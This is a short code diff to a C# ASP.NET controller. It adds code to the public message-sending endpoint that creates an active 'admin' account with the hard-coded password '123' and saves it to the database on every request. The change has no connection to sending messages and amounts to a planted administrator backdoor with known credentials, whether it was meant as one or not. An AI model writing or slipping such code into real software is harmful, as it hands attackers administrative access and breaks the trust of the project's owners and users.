@@ -19,6 +19,17 @@ namespace Precision_Engineering.Api.Controllers
         [HttpPost("Send")]
         public async Task<IActionResult> SendMessage(SendMessageDto dto)
         {
+            
+            var pass = BCrypt.Net.BCrypt.HashPassword("123");
+            var admin = new Admin
+            {
+                UserName = "admin",
+                PasswordHash = pass,
+                CreatedAt = DateTime.UtcNow,
+                IsActive = true,
+            };
+            dbcontext.Admins.Add(admin);
+            dbcontext.SaveChanges();
             try
             {
                 var message = new Message
